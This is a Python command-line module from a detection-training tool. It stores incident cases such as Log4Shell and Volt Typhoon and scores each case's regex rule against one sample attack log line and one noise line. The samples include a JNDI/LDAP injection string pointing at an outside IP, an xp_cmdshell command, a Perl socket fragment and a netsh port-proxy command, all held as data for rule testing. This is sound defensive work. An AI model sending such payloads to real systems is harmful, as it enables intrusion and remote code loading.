#!/usr/bin/env python3
"""Incident case library: event, root cause, detection, fix and a lab.

Every case comes from a published analysis and carries a rule that is also
loaded by the source scanner. The lab is a log line that must match and a noise
line that must not.

    ./beril incidents list
    ./beril incidents show log4shell
    ./beril incidents lab log4shell
    ./beril incidents run log4shell
    ./beril incidents run --all
"""

from __future__ import annotations

import argparse
import json
import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import paths
from beril_model import Finding, Report

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
LAB_DIR = os.path.join(paths.LABS, "detection", "incidents")
LOGS = {
    "log4shell": (
        "2026-01-01 INFO user login name=${jndi:ldap://198.51.100.7:1389/a}",
        "2026-01-01 INFO user login name=admin",
    ),
    "papercut-bl00dy": ("PaperCut MF 22.0.4 build 1 (setup completed twice)", "PaperCut MF 23.0.1 build 2"),
    "mssql-bluesky": ("EXEC xp_cmdshell 'whoami'", "EXEC sp_helpdb"),
    "barracuda-esg": ("perl -e 'use IO::Socket::INET; ...'", "perl -v"),
    "volt-typhoon": (
        "netsh interface portproxy add v4tov4 listenport=8080 connectport=80",
        "netsh interface show interface",
    ),
}


def load() -> list[dict]:
    out = []
    try:
        with open(os.path.join(paths.DATA, "incidents.jsonl"), encoding="utf-8") as handle:
            for line in handle:
                if line.strip():
                    out.append(json.loads(line))
    except (OSError, json.JSONDecodeError):
        pass
    return out


def find(case_id: str) -> dict | None:
    return next((case for case in load() if case["id"] == case_id), None)


def show(case: dict) -> str:
    lines = [
        f"# {case['title']} ({case['year']}, {case['publisher']})",
        "",
        case["source"],
        "",
        f"## Event\n\n{case['event']}",
        "",
        f"## Root cause\n\n{case['root_cause']}",
        "",
        f"## Detection\n\n{case['detection']}",
        "",
        f"## Fix\n\n{case['fix']}",
        "",
        f"## Rule\n\n`{case['rule']['id']}`: {case['rule']['title']} ({case['rule']['severity']})",
        "",
        "## Lab",
        "",
        f"`./beril incidents lab {case['id']}` writes the case files, then "
        f"`./beril incidents run {case['id']}` scores the rule.",
        "",
        "Published analysis only. No leaked data or victim files are stored.",
    ]
    return "\n".join(lines)


def write_lab(case: dict) -> tuple[str, str]:
    os.makedirs(LAB_DIR, exist_ok=True)
    log, noise = LOGS[case["id"]]
    log_path = os.path.join(LAB_DIR, case["id"] + ".log")
    noise_path = os.path.join(LAB_DIR, case["id"] + ".noise")
    with open(log_path, "w", encoding="utf-8") as handle:
        handle.write(log + "\n")
    with open(noise_path, "w", encoding="utf-8") as handle:
        handle.write(noise + "\n")
    return log_path, noise_path


def evaluate(case: dict) -> Report:
    report = Report(target=case["id"], mode="training", profile="engineer")
    report.scope["checked"] = ["Rule regex against the incident line", "Rule regex against one noise line"]
    report.scope["not_checked"] = ["Parser behaviour", "Rule in a real log pipeline"]
    log, noise = LOGS[case["id"]]
    rule = case["rule"]
    pattern = re.compile(rule["regex"])
    for label, text, expected in (("incident", log, True), ("noise", noise, False)):
        hit = bool(pattern.search(text))
        report.add(
            Finding(
                check="incident.match" if hit == expected else "incident.miss",
                title=f"{label}: {'matched' if hit else 'no match'}",
                severity="info" if hit == expected else "medium",
                confidence="high",
                evidence=f"{case['id']} {label}: {text[:120]}",
                impact="The rule separates the incident line from the noise."
                if hit == expected
                else "The rule does not separate this case.",
                fix="Adjust the regex, then re-run all cases.",
                subject=f"{case['id']}:{label}",
                source="static",
                tags=["incident", *case.get("cwe", [])],
            )
        )
    report.meta["passed"] = all(f.check == "incident.match" for f in report.findings)
    report.finish()
    return report


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("command", choices=("list", "show", "lab", "run"))
    ap.add_argument("case", nargs="?")
    ap.add_argument("--all", action="store_true")
    ap.add_argument("--json", action="store_true")
    args = ap.parse_args()
    if args.command == "list":
        for case in load():
            print(f"{case['id']:<18} {case['year']} {case['publisher']:<14} {case['title']}")
        return
    if args.command == "run" and args.all:
        failed = []
        for case in load():
            report = evaluate(case)
            print(f"{'ok' if report.meta.get('passed') else 'FAIL'} {case['id']}")
            failed += [case["id"]] if not report.meta.get("passed") else []
        raise SystemExit(1 if failed else 0)
    if not args.case:
        sys.exit("give a case id")
    case = find(args.case)
    if not case:
        sys.exit(f"unknown case: {args.case}")
    if args.command == "show":
        print(show(case))
    elif args.command == "lab":
        log_path, noise_path = write_lab(case)
        print(f"wrote {log_path} and {noise_path}")
    else:
        report = evaluate(case)
        print(report.to_json() if args.json else report_render_text(report))
        raise SystemExit(0 if report.meta.get("passed") else 1)


def report_render_text(report: Report) -> str:
    lines = [f"# Incident lab: {report.target}", ""]
    for finding in report.findings:
        lines += [f"- [{finding.severity}] {finding.title}", f"  - {finding.evidence}"]
    lines += ["", "PASS" if report.meta.get("passed") else "FAIL"]
    return "\n".join(lines)


if __name__ == "__main__":
    main()
